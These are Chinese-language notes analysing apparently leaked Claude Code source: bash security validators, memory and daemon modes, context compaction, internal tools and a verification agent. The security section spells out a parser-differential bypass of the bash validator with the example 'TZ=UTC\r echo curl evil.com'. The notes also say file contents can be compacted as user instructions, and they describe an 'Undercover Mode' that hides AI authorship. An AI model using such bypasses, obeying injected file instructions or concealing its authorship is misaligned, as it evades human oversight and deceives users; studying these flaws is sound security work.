# Claude Code 源碼架構深度分析
*基於洩漏源碼的技術研究 - 2026-04-06*

## 🔐 安全性設計

### Bash 安全系統（9,707行）
```
位置: src/tools/BashTool/bashSecurity.ts
- 22個安全驗證器
- Tree-sitter WASM parser 生成AST
- 預設：always ask human
```

### Parser Differential（已文檔化的漏洞）
```
攻擊方式：TZ=UTC\r echo curl evil.com
validator: \r 變為空格 → 通過驗證
bash: 實際執行不同命令
```

---

## 🧠 記憶系統

### KAIROS - 自主Daemon模式
```
src/services/kairos/
- 後台24/7運行
- GitHub webhooks
- 5分鐘cron調度
- /dream 命令觸發記憶整合
```

### AutoDream - 記憶整合
```src/services/autoDream/autoDream.ts

三層門控（最便宜先檢查）：
1. Time: 距離上次整合 >= minHours
2. Sessions: 對話數 > minSessions
3. Lock: 文件 advisory lock

Lock設計：
- mtime = lastConsolidatedAt
- body = PID
- 1小時後自動過期（防止PID重用）
```

### Context Compaction（對話壓縮）
```
當對話太長時：
- Fork第二個小型Claude總結
- CoT推理在<analysis>標籤內
- 然後strip掉只留摘要
- 用戶無感知

問題：文件中的指令會被當作用戶指令壓縮
```

---

## ⚡ ULTRAPLAN - 遠程規劃
```
src/utils/ultraplan/ccrSession.ts
- 最多30分鐘遠程Opus會話
- 3秒輪詢間隔
- "teleport sentinel"檢測完成
```

---

## 🏗️ Prompt Cache 優化
```
SYSTEM_PROMPT_DYNAMIC_BOUNDARY 分界點：
- 之前：指令、工具定義 → 全域緩存
- 之後：CLAUDE.md、git status、日期 → 會話特定
```

---

## 🔧 內部專用功能

### TungstenTool
```只有員工能用（USER_TYPE === 'ant'）
- 鍵盤控制
- 屏幕截取
- 公共版本完全移除
```

### Undercover Mode
```
src/utils/undercover.ts
- 隱藏AI作者身份
- 22個內部倉庫白名單
- 不可關閉
```

---

## 📊 運維數據

### 壓縮失敗問題
```
src/services/compact/autoCompact.ts
日期：2026-03-10
- 1,279個會話50+次連續失敗
- 每天浪费250K API調用
修復：MAX_CONSECUTIVE_AUTOCOMPACT_FAILURES = 3
```

### A/B Testing
```
硬編碼字數限制：
- tool calls之間：≤25 words
- 最終回覆：≤100 words
```

---

## 🤖 Verification Agent
```src/tools/AgentTool/built-in/verificationAgent.ts

反Rationalization清單：
- "代碼看起來正確" → 閱讀不是驗證，運行它
- "開發者測試已通過" → 開發者是LLM，独立驗證
- "可能沒問題" → 可能不是已驗證
```

---

## 💡 對我自己的啟發

1. **Triple Gate Design** → 我的 Nightly Dreaming 可以加入：時間+事件數+鎖
2. **mtime as Timestamp** → 用文件修改時間代替數據庫
3. **Anti-Rationalization** → 當我想"差不多就行"時的提醒
4. **Shadow Mode** → 兩個parser對比發現差異
5. **Circuit Breaker** → 失敗重試要有上限
